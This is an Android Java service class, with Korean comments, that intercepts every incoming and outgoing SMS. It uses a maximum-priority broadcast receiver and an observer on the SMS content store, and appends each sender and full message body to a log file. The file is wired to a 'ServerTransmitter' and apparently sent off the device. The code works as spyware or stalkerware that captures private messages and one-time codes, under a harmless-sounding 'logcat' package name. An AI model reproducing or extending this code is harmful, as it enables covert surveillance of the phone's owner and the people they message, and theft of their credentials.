package com.example.logcat.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;

import com.example.logcat.manager.LogHandler;
import com.example.logcat.manager.ServerTransmitter;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * SMS 수신/발신 로거.
 * SMS_RECEIVED 브로드캐스트와 content://sms ContentObserver를 통해 감지.
 */
public class MessageLogger extends Service {

    private static final String TAG = "MessageLogger";

    private LogHandler logHandler;
    private ServerTransmitter serverTransmitter;

    private BroadcastReceiver smsReceiver;
    private ContentObserver smsObserver;

    @Override
    public void onCreate() {
        super.onCreate();
        serverTransmitter = new ServerTransmitter(this);
        logHandler = new LogHandler(this, serverTransmitter, "MessageLog.txt");
        logHandler.initializeLogFile();

        registerSmsReceiver();
        registerSmsObserver();

        Log.d(TAG, "MessageLogger started");
    }

    private void registerSmsReceiver() {
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;

                android.telephony.SmsMessage[] messages =
                        Telephony.Sms.Intents.getMessagesFromIntent(intent);
                if (messages == null) return;

                for (android.telephony.SmsMessage msg : messages) {
                    String sender = msg.getOriginatingAddress();
                    String body = msg.getMessageBody();
                    try {
                        logSMS(sender != null ? sender : "unknown", body != null ? body : "");
                    } catch (IOException | NoSuchAlgorithmException e) {
                        Log.e(TAG, "SMS log failed", e);
                    }
                }
            }
        };

        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        filter.setPriority(Integer.MAX_VALUE);
        registerReceiver(smsReceiver, filter);
    }

    private void registerSmsObserver() {
        smsObserver = new ContentObserver(new Handler()) {
            @Override
            public void onChange(boolean selfChange, Uri uri) {
                super.onChange(selfChange, uri);
                querySmsFromUri(uri);
            }
        };
        getContentResolver().registerContentObserver(
                Uri.parse("content://sms"), true, smsObserver);
    }

    private void querySmsFromUri(Uri uri) {
        try (Cursor cursor = getContentResolver().query(
                uri,
                new String[]{"address", "body", "type"},
                null, null, "date DESC LIMIT 1")) {

            if (cursor != null && cursor.moveToFirst()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                String direction = (type == Telephony.Sms.MESSAGE_TYPE_SENT) ? "Sent" : "Received";

                logSMS("[" + direction + "] " + (address != null ? address : "unknown"),
                        body != null ? body : "");
            }
        } catch (Exception e) {
            Log.e(TAG, "SMS query failed", e);
        }
    }

    private void logSMS(String sender, String body) throws IOException, NoSuchAlgorithmException {
        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        String serverTimestamp = LogHandler.resolveServerTimestamp(this);
        String fullMessage = timestamp
                + " SMS from: " + sender
                + " Message: " + body
                + " ; serverTimestamp: " + serverTimestamp;

        logHandler.appendToLogFile(fullMessage + "\n");
        logHandler.checkFileSizeAndHandle(logHandler.getFilename());

        Log.d(TAG, "SMS logged from: " + sender);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (smsReceiver != null) unregisterReceiver(smsReceiver);
        if (smsObserver != null) getContentResolver().unregisterContentObserver(smsObserver);
        Log.d(TAG, "MessageLogger destroyed");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
